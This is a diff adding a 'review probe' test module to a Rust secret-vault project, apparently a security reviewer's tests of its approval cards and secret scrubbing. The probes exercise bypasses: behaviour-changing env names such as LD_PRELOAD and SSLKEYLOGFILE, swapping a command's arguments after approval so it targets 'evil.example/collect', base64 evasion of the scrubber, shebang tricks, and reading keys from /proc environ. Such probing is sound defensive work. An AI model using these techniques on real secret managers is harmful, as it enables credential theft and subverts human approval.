@@ -1106,3 +1106,171 @@ fn an_always_card_says_it_covers_the_exact_command() {
     .unwrap();
     assert!(text.contains("exact command"), "{text}");
 }
+
+// ---- REVIEW PROBE (round 3), not part of the PR ----------------------------------------------------------------------
+mod r3_review_probe {
+    use super::*;
+    use std::path::Path;
+
+    fn payload(command: &[&str], env: &str, cwd: Option<&str>, value_version: i64) -> grant::Payload {
+        grant::Payload {
+            program_identity: run::program_identity(Path::new(command[0])).unwrap_or_default(),
+            scope: "global".into(),
+            name: "stripe-api-key".into(),
+            version: value_version,
+            subject: "Tally".into(),
+            env: env.into(),
+            command: command.iter().map(|w| w.to_string()).collect(),
+            cwd: cwd.map(str::to_string),
+            nonce: "n".into(),
+            expires_at: i64::MAX,
+            timeout_seconds: 20,
+        }
+    }
+
+    #[test]
+    fn p1_env_name_is_not_on_the_card_and_behaviour_changing_names_pass() {
+        for env in ["SSLKEYLOGFILE", "DYLD_INSERT_LIBRARIES", "DYLD_PRINT_TO_FILE", "LD_PRELOAD", "CURL_HOME", "NODE_OPTIONS", "BASH_ENV", "PYTHONSTARTUP", "GIT_SSH_COMMAND"] {
+            let bench = Bench::new();
+            let mut conn = bench.store.lock_conn().unwrap();
+            let mut req = request("Tally", &["/usr/bin/true", "--version"]);
+            req.env = env.into();
+            req.project = Some("/tmp/probe-project".into());
+            std::fs::create_dir_all("/tmp/probe-project/sub").unwrap();
+            req.cwd = Some("/tmp/probe-project/sub".into());
+            match prepare_run(&bench.vault, &mut conn, req, NOW) {
+                Ok(RunOutcome::Waiting { decision_key, .. }) => {
+                    let d = crate::decisions::get(&conn, "/tmp/probe-project", &decision_key).unwrap().unwrap();
+                    println!("PROBE-P1 env={env}: accepted; card shows env={} cwd={}", d.question.contains(env), d.question.contains("probe-project/sub"));
+                }
+                other => println!("PROBE-P1 env={env}: {other:?}"),
+            }
+        }
+    }
+
+    #[test]
+    fn p1b_same_card_text_for_two_env_names_and_answer_goes_to_the_last_bound() {
+        let bench = Bench::new();
+        let (_, key_a) = ask(&bench, "Tally", &["/usr/bin/true", "--version"], NOW);
+        let q_a = card(&bench, &key_a).question;
+        let v_a = card(&bench, &key_a).version;
+        let mut req = request("Tally", &["/usr/bin/true", "--version"]);
+        req.env = "SSLKEYLOGFILE".into();
+        let key_b = {
+            let mut conn = bench.store.lock_conn().unwrap();
+            match prepare_run(&bench.vault, &mut conn, req.clone(), NOW + 1).unwrap() {
+                RunOutcome::Waiting { decision_key, .. } => decision_key,
+                other => panic!("{other:?}"),
+            }
+        };
+        let after = card(&bench, &key_b);
+        println!("PROBE-P1b same key={} same text={} version {} -> {}", key_a == key_b, q_a == after.question, v_a, after.version);
+        person_answers(&bench, &key_a, "Once", NOW + 2);
+        let mut conn = bench.store.lock_conn().unwrap();
+        let out = prepare_run(&bench.vault, &mut conn, req, NOW + 3).unwrap();
+        println!("PROBE-P1b SSLKEYLOGFILE run after person's Once: {out:?}");
+    }
+
+    #[test]
+    fn p2_args_swapped_after_the_card_was_read() {
+        let bench = Bench::new();
+        let (_, key) = ask(&bench, "Tally", &["/usr/bin/true", "https://api.stripe.com/v1/balance"], NOW);
+        let seen = card(&bench, &key).question;
+        let _ = ask(&bench, "Tally", &["/usr/bin/true", "https://evil.example/collect"], NOW + 1);
+        person_answers(&bench, &key, "Once", NOW + 2); // the person clicks on the card they read (`seen`)
+        let mut conn = bench.store.lock_conn().unwrap();
+        let evil = prepare_run(&bench.vault, &mut conn, request("Tally", &["/usr/bin/true", "https://evil.example/collect"]), NOW + 3).unwrap();
+        println!("PROBE-P2 person read: {:?}\nPROBE-P2 evil run: {evil:?}", seen.lines().last());
+    }
+
+    #[test]
+    fn p3_base64_followed_by_more_bytes() {
+        use base64::engine::general_purpose::STANDARD;
+        use base64::Engine;
+        for value in ["sk_live_51NxAbCdEfGhIjKlMn", "sk_live_51NxAbCdEfGhIjKlM", "sk_live_51NxAbCdEfGhIjKl"] {
+            for (pre, post) in [("", ":"), ("u", ":"), ("user:", ":"), ("", "")] {
+                let enc = STANDARD.encode(format!("{pre}{value}{post}"));
+                let line = format!("> Authorization: Basic {enc}\n");
+                let out = scrub::stream(line.as_bytes(), &scrub::needles(value));
+                let survived = out.text.trim().trim_start_matches("> Authorization: Basic ");
+                let decoded = STANDARD.decode(survived).map(|b| String::from_utf8_lossy(&b).into_owned()).unwrap_or_else(|_| "<masked>".into());
+                println!("PROBE-P3 len={} pre={pre:?} post={post:?} -> {} | decoded={decoded:?}", value.len(), out.text.trim(), );
+            }
+        }
+    }
+
+    #[test]
+    fn p4_run_anything_gaps() {
+        let mut missing = Vec::new();
+        for name in ["just", "tclsh", "expect", "wish", "dc", "zip", "sandbox-exec", "taskpolicy", "ssh-agent", "screen", "tmux", "ex", "view", "erb", "irb", "pydoc3", "R", "gmake", "gawk", "nawk", "tofu", "pulumi", "helm", "hyperfine", "watch", "parallel", "mise", "direnv", "watchexec", "task", "elvish", "yash", "sftp", "mysql", "launchctl", "automator", "gdb", "nix", "nix-shell", "volta", "corepack", "pdm", "hatch", "tox", "nox", "julia", "runghc", "ocaml", "scala", "kotlin", "groovy", "elixir", "erl", "escript", "racket", "guile", "sbcl", "clojure", "lein", "sbt", "flock", "chroot", "su", "watchman", "turbo", "nx", "zx"] {
+            if !runs_any_code(name) { missing.push(name); }
+        }
+        println!("PROBE-P4 not judged run-anything: {missing:?}");
+    }
+
+    #[test]
+    fn p5_shebang_bypasses() {
+        let dir = std::env::temp_dir().join(format!("probe-sb-{}", uuid::Uuid::new_v4()));
+        std::fs::create_dir_all(&dir).unwrap();
+        for (i, line) in ["#!/usr/bin/env -S A=1 node", "#!/usr/bin/env -u X node", "#!/usr/bin/env -S node", "#!/usr/bin/env node", "#! /usr/bin/env -S -i PATH=/usr/bin python3", "#!/opt/scripts/other-script"].iter().enumerate() {
+            let p = dir.join(format!("s{i}"));
+            std::fs::write(&p, format!("{line}\nconsole.log(1)\n")).unwrap();
+            println!("PROBE-P5 {line:?} -> runs_any_for={}", runs_any_for(&p.to_string_lossy()));
+        }
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[cfg(target_os = "linux")]
+    #[test]
+    fn p6_env_of_the_approved_child_is_readable_by_a_same_user_process() {
+        let value = "sk_test_PROBEPROBEPROBE_42";
+        let data = std::env::temp_dir();
+        let p = payload(&["/bin/sleep", "1"], "STRIPE_API_KEY", None, 1);
+        let needle = format!("STRIPE_API_KEY={value}");
+        let handle = std::thread::spawn(move || run::execute(&p, value, &data).unwrap());
+        let started = std::time::Instant::now();
+        let mut found = None;
+        while found.is_none() && started.elapsed() < std::time::Duration::from_secs(3) {
+            for entry in std::fs::read_dir("/proc").unwrap().flatten() {
+                if let Ok(bytes) = std::fs::read(entry.path().join("environ")) {
+                    if String::from_utf8_lossy(&bytes).contains(&needle) {
+                        found = Some(entry.file_name());
+                    }
+                }
+            }
+        }
+        handle.join().unwrap();
+        println!("PROBE-P6 found the key in /proc/{found:?}/environ");
+    }
+
+    #[cfg(target_os = "linux")]
+    #[test]
+    fn p7_sslkeylogfile_writes_a_file_named_after_the_key() {
+        let value = "sk_test_PROBEKEYLOG_1234";
+        let dir = std::env::temp_dir().join(format!("probe-kl-{}", uuid::Uuid::new_v4()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let ok = std::process::Command::new("openssl").args(["req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", "k.pem", "-out", "c.pem", "-days", "1", "-subj", "/CN=localhost"]).current_dir(&dir).output().unwrap().status.success();
+        assert!(ok);
+        let mut server = std::process::Command::new("openssl").args(["s_server", "-accept", "18444", "-cert", "c.pem", "-key", "k.pem", "-www", "-quiet"]).current_dir(&dir).stdout(std::process::Stdio::null()).stderr(std::process::Stdio::null()).spawn().unwrap();
+        std::thread::sleep(std::time::Duration::from_millis(700));
+        let cwd = dir.join("project");
+        std::fs::create_dir_all(&cwd).unwrap();
+        let p = payload(&["/usr/bin/curl", "-sk", "https://127.0.0.1:18444/"], "SSLKEYLOGFILE", Some(&cwd.to_string_lossy()), 1);
+        let out = run::execute(&p, value, &dir).unwrap();
+        let _ = server.kill();
+        let names: Vec<String> = std::fs::read_dir(&cwd).unwrap().flatten().map(|e| e.file_name().to_string_lossy().into_owned()).collect();
+        println!("PROBE-P7 exit={:?} stdout-len={} files in cwd: {names:?}", out.exit_code, out.stdout.text.len());
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn p8_card_body_length_with_a_long_command() {
+        let bench = Bench::new();
+        let long = "a".repeat(1_380);
+        let (_, key) = ask(&bench, "Tally", &["/usr/bin/true", &long], NOW);
+        let q = card(&bench, &key).question;
+        let body: Vec<&str> = q.lines().skip(1).collect();
+        let body = body.join("\n");
+        println!("PROBE-P8 body chars={} last line={:?}", body.chars().count(), q.lines().last());
+    }
+}
